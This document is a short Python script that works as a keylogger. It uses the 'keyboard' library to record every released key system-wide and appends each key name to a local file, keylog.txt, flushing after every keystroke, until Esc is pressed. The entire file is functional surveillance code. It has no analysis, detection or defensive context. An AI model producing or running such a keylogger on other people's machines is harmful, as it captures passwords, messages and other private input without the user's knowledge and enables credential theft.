import keyboard

# Open a file in append mode to store keystrokes
log_file = open("keylog.txt", "a")

# Define callback function to capture keystrokes
def callback(event):
    # Write the name of the pressed key to the file
    log_file.write(event.name + "\n")
    log_file.flush()  # Flush the buffer to ensure data is written immediately

# Start capturing keystrokes
keyboard.on_release(callback)

# Keep the program running
keyboard.wait('esc')  # Press 'esc' to exit

# Close the log file when done
log_file.close()